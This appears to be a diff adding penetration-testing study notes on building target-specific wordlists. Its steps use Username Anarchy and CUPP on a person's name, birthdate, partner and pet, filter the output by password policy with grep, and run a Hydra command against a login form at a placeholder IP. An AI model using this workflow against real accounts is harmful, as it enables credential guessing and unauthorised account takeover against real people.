@@ -1,0 +1,199 @@
+# 🔐 Custom Wordlists for Brute Force Attacks
+
+---
+
+# 📌 1. Introduction
+
+Pre-built wordlists like `rockyou.txt` or SecLists are useful, but they are **generic** and not always efficient for targeted attacks.
+
+Custom wordlists are:
+
+* Target-specific
+* More efficient
+* Higher success rate
+
+They use information gathered from OSINT (Open Source Intelligence).
+
+---
+
+# 🎯 2. Why Custom Wordlists?
+
+Generic lists:
+
+* Very large
+* Time-consuming
+* Low probability for specific targets
+
+Custom lists:
+
+* Focused on target
+* Faster brute-force
+* Higher accuracy
+
+Example:
+Instead of using millions of usernames, generate:
+
+```
+janesmith
+smithj
+j.smith
+```
+
+---
+
+# 🧠 3. Username Generation – Username Anarchy
+
+Username Anarchy generates multiple username combinations from a name.
+
+---
+
+## Installation
+
+```bash
+sudo apt install ruby -y
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+```
+
+---
+
+## Usage
+
+```bash
+./username-anarchy Jane Smith > jane_usernames.txt
+```
+
+---
+
+## Output Examples
+
+* janesmith
+* smithjane
+* jane.smith
+* jsmith
+* j.smith
+
+---
+
+# 🔑 4. Password Generation – CUPP
+
+CUPP (Common User Passwords Profiler) generates **custom password lists** using target information.
+
+---
+
+## Installation
+
+```bash
+sudo apt install cupp -y
+```
+
+---
+
+## Run Interactive Mode
+
+```bash
+cupp -i
+```
+
+---
+
+## Example Input
+
+```
+First Name: Jane
+Surname: Smith
+Nickname: Janey
+Birthdate: 11121990
+Partner: Jim
+Pet: Spot
+Company: AHI
+Keywords: hacker,blue
+```
+
+---
+
+## Output File
+
+```bash
+jane.txt
+```
+
+---
+
+## Password Types Generated
+
+* Basic: jane, smith
+* With numbers: jane123
+* With symbols: jane@
+* Leetspeak: j4n3
+* Combined: Jane1990!
+
+---
+
+# 🔍 5. Filtering Passwords (Policy Based)
+
+Example policy:
+
+* Minimum 6 characters
+* Uppercase required
+* Lowercase required
+* Number required
+* 2 special characters
+
+---
+
+## Filter Command
+
+```bash
+grep -E '^.{6,}$' jane.txt | \
+grep -E '[A-Z]' | \
+grep -E '[a-z]' | \
+grep -E '[0-9]' | \
+grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+```
+
+---
+
+# ⚡ 6. Using Custom Lists in Hydra
+
+```bash
+hydra -L jane_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+```
+
+---
+
+# 🧠 7. Workflow (Important)
+
+1. Collect OSINT data
+2. Generate usernames (Username Anarchy)
+3. Generate passwords (CUPP)
+4. Filter passwords (policy-based)
+5. Run Hydra attack
+6. Get credentials
+
+---
+
+# 🔥 8. Key Advantage
+
+Custom wordlists:
+
+* Reduce brute-force time
+* Increase success probability
+* Focus attack on target
+
+---
+
+# ❌ 9. Common Mistakes
+
+* Using only generic lists
+* Ignoring password policies
+* Not collecting enough OSINT
+* Not filtering wordlists
+
+---
+
+# 🎯 Final Concept
+
+> Better input data → Better wordlist → Faster and successful attack
+
+---
